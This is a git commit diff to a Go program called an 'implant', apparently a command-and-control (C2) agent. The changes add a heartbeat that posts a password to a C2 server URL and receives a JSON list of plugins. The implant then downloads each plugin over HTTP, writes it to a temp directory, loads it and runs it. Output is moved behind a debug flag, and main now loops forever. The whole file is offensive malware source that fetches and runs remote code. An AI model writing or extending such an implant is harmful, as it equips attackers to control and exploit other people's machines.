8374b0747ac396ad9c9a85bfea9e2b8e0a22f34e
Nik Swap <nikswap@local.host>
2023-12-25 17:25:17 +0100

    Added more functionality to implant

--- golang/implant/main.go
+++ golang/implant/main.go
@@ -1,11 +1,14 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
+	"net/http"
+	"net/url"
 	"os"
 	"plugin"
-	"strconv"
 )
 
 var PrintDebugMessages bool
@@ -19,10 +22,15 @@ type ImplantPlugin struct {
 }
 
 type ImplantClient struct {
-	Server       string
-	Port         int
+	Url          string
 	C2Pass       string
 	PluginsToRun []ImplantPlugin
+}
+
+type PluginsFromC2 []struct {
+	PluginID   string `json:"pluginId"`
+	PluginURL  string `json:"pluginUrl"`
+	PluginName string `json:"pluginName"`
 }
 
 func DebugPrinter(msg string) {
@@ -37,16 +45,15 @@ func CheckError(err error) {
 	}
 }
 
-func (implantClient ImplantClient) DownloadPlugin(pluginUrl string) (string, error) {
-	return "", nil
-}
-
 func (implantClient ImplantClient) DownloadPlugins() error {
 	for idx, pluginToDownload := range implantClient.PluginsToRun {
-		pluginBase64 := ""
 		DebugPrinter("Downloading from " + pluginToDownload.PluginUrl)
-		//Write plugins to temp dir
-		path, err := implantClient.WritePluginToTempDir(pluginBase64)
+		res, err := http.Get(pluginToDownload.PluginUrl)
+		defer res.Body.Close()
+		pluginBase64, err := ioutil.ReadAll(res.Body)
+		CheckError(err)
+		DebugPrinter("GOT: " + string(pluginBase64))
+		path, err := implantClient.WritePluginToTempDir(string(pluginBase64))
 		if err != nil {
 			return nil
 		}
@@ -73,7 +80,7 @@ func (implantClient ImplantClient) ExecutePlugins() error {
 
 		doItFunc, ok := doItSymbol.(func() (string, error))
 		if !ok {
-			fmt.Println("Could not do the thing")
+			DebugPrinter("Could not do the thing")
 		}
 
 		result, err := doItFunc()
@@ -81,7 +88,7 @@ func (implantClient ImplantClient) ExecutePlugins() error {
 			return err
 		}
 
-		fmt.Println("RESULT: " + result)
+		DebugPrinter("RESULT: " + result)
 		implantClient.PluginsToRun[idx].PluginResult = result
 	}
 	return nil
@@ -89,7 +96,23 @@ func (implantClient ImplantClient) ExecutePlugins() error {
 
 func (implantClient ImplantClient) HeartBeat() error {
 	//Call C2 server get json list of plugins
+	res, err := http.PostForm(implantClient.Url, url.Values{
+		"client_password": {implantClient.C2Pass}})
 	//Update Plugin list
+	defer res.Body.Close()
+	body, err := ioutil.ReadAll(res.Body)
+	CheckError(err)
+	var data PluginsFromC2
+	json.Unmarshal([]byte(body), &data)
+	for _, pluginFromC2 := range data {
+		pluginToAdd := &ImplantPlugin{
+			PluginId:   pluginFromC2.PluginID,
+			PluginName: pluginFromC2.PluginName,
+			PluginUrl:  pluginFromC2.PluginURL,
+		}
+		implantClient.PluginsToRun = append(implantClient.PluginsToRun, *pluginToAdd)
+	}
+	//Decode body and add to plugin list
 	return nil
 }
 
@@ -124,48 +147,18 @@ func main() {
 	}
 
 	host := os.Args[1]
-	port := os.Args[2]
 	c2_pass := os.Args[3]
-	portNo, err := strconv.Atoi(port)
-	CheckError(err)
 
-	fmt.Println("Connecting to " + host + " with port " + port)
+	fmt.Println("Connecting to " + host)
 
 	implant := &ImplantClient{
-		Server:       host,
-		Port:         portNo,
+		Url:          host,
 		C2Pass:       c2_pass,
 		PluginsToRun: make([]ImplantPlugin, 10),
 	}
 
-	err = implant.Loop()
-	CheckError(err)
-
-	// mod := os.Args[1]
-	// plugin, err := plugin.Open(mod)
-	// CheckError(err)
-
-	// doItSymbol, err := plugin.Lookup("DoIt")
-	// CheckError(err)
-
-	// doItFunc, ok := doItSymbol.(func() (string, error))
-	// if !ok {
-	// 	fmt.Println("Could not do the thing")
-	// }
-
-	// result, err := doItFunc()
-	// CheckError(err)
-
-	// fmt.Println("RESULT: " + result)
-
-	// symSpeaker, err := plugin.Lookup("Speaker")
-	// CheckError(err)
-
-	// var speaker Speaker
-	// speaker, ok := symSpeaker.(Speaker)
-	// if !ok {
-	// 	return errors.New("unexpected type from module symbol")
-	// }
-
-	// speaker.Speak()
+	for {
+		err = implant.Loop()
+		CheckError(err)
+	}
 }
